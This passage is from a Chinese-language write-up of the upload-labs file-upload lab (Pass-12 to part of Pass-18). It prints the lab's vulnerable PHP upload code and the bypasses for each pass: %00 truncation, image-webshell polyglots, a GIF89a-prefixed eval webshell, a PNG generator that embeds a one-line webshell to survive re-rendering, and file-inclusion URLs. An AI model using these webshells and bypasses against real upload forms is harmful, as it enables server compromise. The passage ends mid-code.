class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span>&#123;        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;    &#125;&#125;</code></pre></div><blockquote><p>这个漏洞满足条件:</p><ol><li>PHP版本&lt;5.3.4</li><li>PHP的magic_quotes_gpc必须为Off的状态(默认开启!!!)</li></ol><p>这个漏洞基本淘汰了~</p></blockquote><h3 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="%00截断绕过"></a>%00截断绕过</h3><p>程序读字符读到%00 后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生</p><div class="code-wrapper"><pre><code class="hljs php">本题关键在于路径正常上传的路径为:../upload/xxxjpg但我们构造payload的上传路径为:../upload/<span class="hljs-number">1</span>.php%<span class="hljs-number">00</span>xxx.jpg这个时候程序就会执行%<span class="hljs-number">00</span>截断,文件成为<span class="hljs-number">1</span>.php</code></pre></div><h3 id="抓取数据包并修改数据-6"><a href="#抓取数据包并修改数据-6" class="headerlink" title="抓取数据包并修改数据"></a>抓取数据包并修改数据</h3><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-12burp%E6%8A%93%E5%8C%85.png"></p><br><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><blockquote><p>本pass上传路径可控！</p></blockquote><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传失败&quot;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;    &#125;&#125;</code></pre></div><h3 id="00截断绕过-1"><a href="#00截断绕过-1" class="headerlink" title="%00截断绕过"></a>%00截断绕过</h3><p>本题与Pass-12类似,只不过请求方法由GET变成POST,这个时候就要注意由于GET请求时会进行urldecode,而POST请求时不会进行urldecode所以需要手动进行urldecode</p><h3 id="抓取数据包并修改数据-7"><a href="#抓取数据包并修改数据-7" class="headerlink" title="抓取数据包并修改数据"></a>抓取数据包并修改数据</h3><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-13burp%E6%8A%93%E5%8C%85.gif"></p><blockquote><p>文件名后缀.php1,这里将1的十六进制的值31改为00</p></blockquote><br><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><blockquote><p>本pass检查图标内容开头2个字节！</p></blockquote><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;    <span class="hljs-variable">$file</span> = fopen(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);    <span class="hljs-variable">$bin</span> = fread(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span>    fclose(<span class="hljs-variable">$file</span>);    <span class="hljs-variable">$strInfo</span> = @unpack(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);        <span class="hljs-variable">$typeCode</span> = intval(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);        <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;        <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;              <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:                        <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:                        <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;            <span class="hljs-keyword">break</span>;                <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:                        <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">default</span>:                        <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;        &#125;            <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;&#125;<span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];    <span class="hljs-variable">$file_type</span> = getReailFileType(<span class="hljs-variable">$temp_file</span>);    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_type</span> == <span class="hljs-string">&#x27;unknown&#x27;</span>)&#123;        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_type</span>;        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;        &#125;    &#125;&#125;</code></pre></div><h3 id="图马制作"><a href="#图马制作" class="headerlink" title="图马制作"></a>图马制作</h3><p>本题用检测内容的方式进行验证,且有文件包含的漏洞,所以用图马+文件包含来执行漏洞</p><blockquote><p>准备一张jpg、png或者gif图片</p><p>准备一个php WebShell</p></blockquote><div class="code-wrapper"><pre><code class="hljs powershell">图片 大了一岁.jpgWebShell:&lt;?phpphpinfo();    @eval(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;shell&quot;</span>]);?&gt;图马制作命令(Windows环境)<span class="hljs-built_in">copy</span> 大了一岁.jpg + a.php b.php</code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E5%9B%BE%E9%A9%AC%E5%88%B6%E4%BD%9C.png"></p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>靶机已经提供了文件包含漏洞的网页文件,访问即可</p><div class="code-wrapper"><pre><code class="hljs powershell">http://<span class="hljs-number">192.168</span>.<span class="hljs-number">78.101</span>/upload/include.php?file=upload/xxx(上传后的文件名).jpg</code></pre></div><br><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><blockquote><p>本pass使用getimagesize()检查是否为图片文件！</p></blockquote><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;    <span class="hljs-variable">$types</span> = <span class="hljs-string">&#x27;.jpeg|.png|.gif&#x27;</span>;    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$filename</span>))&#123;        <span class="hljs-variable">$info</span> = getimagesize(<span class="hljs-variable">$filename</span>);        <span class="hljs-variable">$ext</span> = image_type_to_extension(<span class="hljs-variable">$info</span>[<span class="hljs-number">2</span>]);        <span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$types</span>,<span class="hljs-variable">$ext</span>)&gt;=<span class="hljs-number">0</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-variable">$ext</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;&#125;<span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];    <span class="hljs-variable">$res</span> = isImage(<span class="hljs-variable">$temp_file</span>);    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)&#123;        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-variable">$res</span>;        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;        &#125;    &#125;&#125;</code></pre></div><h3 id="图马制作-1"><a href="#图马制作-1" class="headerlink" title="图马制作"></a>图马制作</h3><div class="code-wrapper"><pre><code class="hljs powershell">做gif的马GIF89a&lt;?php     phpinfo();    @eval(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;shell&quot;</span>]);?&gt;保存.gif的后缀</code></pre></div><h3 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a>文件包含</h3><p>上传,文件包含访问执行代码</p><div class="code-wrapper"><pre><code class="hljs powershell">http://<span class="hljs-number">192.168</span>.<span class="hljs-number">78.101</span>/upload/include.php?file=upload/xxx(上传后的文件名).gif</code></pre></div><br><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><blockquote><p>本pass使用exif_imagetype()检查是否为图片文件！</p></blockquote><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;    <span class="hljs-comment">//需要开启php_exif模块</span>    <span class="hljs-variable">$image_type</span> = exif_imagetype(<span class="hljs-variable">$filename</span>);    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$image_type</span>) &#123;        <span class="hljs-keyword">case</span> IMAGETYPE_GIF:            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;gif&quot;</span>;            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> IMAGETYPE_JPEG:            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;jpg&quot;</span>;            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> IMAGETYPE_PNG:            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;png&quot;</span>;            <span class="hljs-keyword">break</span>;            <span class="hljs-keyword">default</span>:            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;            <span class="hljs-keyword">break</span>;    &#125;&#125;<span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];    <span class="hljs-variable">$res</span> = isImage(<span class="hljs-variable">$temp_file</span>);    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)&#123;        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$res</span>;        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;        &#125;    &#125;&#125;</code></pre></div><blockquote><p>这题还是用Pass-15的gif马,一模一样的流程</p></blockquote><br><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><blockquote><p>本pass重新渲染了图片！</p></blockquote><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;    <span class="hljs-comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];    <span class="hljs-variable">$filetype</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];    <span class="hljs-variable">$tmpname</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];    <span class="hljs-variable">$target_path</span>=UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.basename(<span class="hljs-variable">$filename</span>);    <span class="hljs-comment">// 获得上传文件的扩展名</span>    <span class="hljs-variable">$fileext</span>= substr(strrchr(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;.&quot;</span>),<span class="hljs-number">1</span>);    <span class="hljs-comment">//判断文件后缀与类型，合法才进行上传操作</span>    <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/jpeg&quot;</span>))&#123;        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;            <span class="hljs-comment">//使用上传的图片生成新的图片</span>            <span class="hljs-variable">$im</span> = imagecreatefromjpeg(<span class="hljs-variable">$target_path</span>);            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是jpg格式的图片！&quot;</span>;                @unlink(<span class="hljs-variable">$target_path</span>);            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-comment">//给新图片指定文件名</span>                srand(time());                <span class="hljs-variable">$newfilename</span> = strval(rand()).<span class="hljs-string">&quot;.jpg&quot;</span>;                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;                imagejpeg(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);                @unlink(<span class="hljs-variable">$target_path</span>);                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;        &#125;    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;png&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/png&quot;</span>))&#123;        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;            <span class="hljs-comment">//使用上传的图片生成新的图片</span>            <span class="hljs-variable">$im</span> = imagecreatefrompng(<span class="hljs-variable">$target_path</span>);            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是png格式的图片！&quot;</span>;                @unlink(<span class="hljs-variable">$target_path</span>);            &#125;<span class="hljs-keyword">else</span>&#123;                 <span class="hljs-comment">//给新图片指定文件名</span>                srand(time());                <span class="hljs-variable">$newfilename</span> = strval(rand()).<span class="hljs-string">&quot;.png&quot;</span>;                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;                imagepng(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);                @unlink(<span class="hljs-variable">$target_path</span>);                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;                           &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;        &#125;    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;gif&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/gif&quot;</span>))&#123;        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;            <span class="hljs-comment">//使用上传的图片生成新的图片</span>            <span class="hljs-variable">$im</span> = imagecreatefromgif(<span class="hljs-variable">$target_path</span>);            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是gif格式的图片！&quot;</span>;                @unlink(<span class="hljs-variable">$target_path</span>);            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-comment">//给新图片指定文件名</span>                srand(time());                <span class="hljs-variable">$newfilename</span> = strval(rand()).<span class="hljs-string">&quot;.gif&quot;</span>;                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;                imagegif(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);                @unlink(<span class="hljs-variable">$target_path</span>);                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;        &#125;    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;    &#125;&#125;</code></pre></div><h4 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h4><blockquote><p>二次渲染绕过介绍<a href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a></p></blockquote><h3 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h3><blockquote><p>需要linux环境,实测Windows跑出来的文件没有关键代码</p></blockquote><div class="code-wrapper"><pre><code class="hljs php">新建一个payload.php文件<span class="hljs-meta">&lt;?php</span><span class="hljs-comment">//png.php</span><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<span class="hljs-variable">$img</span> = imagecreatetruecolor(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; sizeof(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];   <span class="hljs-variable">$color</span> = imagecolorallocate(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);   imagesetpixel(<span class="hljs-variable">$img</span>, round(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);&#125;imagepng(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./payload.png&#x27;</span>);<span class="hljs-meta">?&gt;</span>准备一张png图片执行命令php payload.php <span class="hljs-number">1</span>.png得到一张payload.png里面包含一句话木马<span class="hljs-meta">&lt;?=</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></code></pre></div><h3 id="文件包含-2"><a href="#文件包含-2" class="headerlink" title="文件包含"></a>文件包含</h3><p>使用include.php包含上传的图片,使用AntSword连接一句话木马即可</p><br><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><blockquote><p>需要代码审计！</p></blockquote><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$file_name</span>,strrpos(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);    <span class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;    <span class="hljs-keyword">if</span>(move_uploaded_file(<span 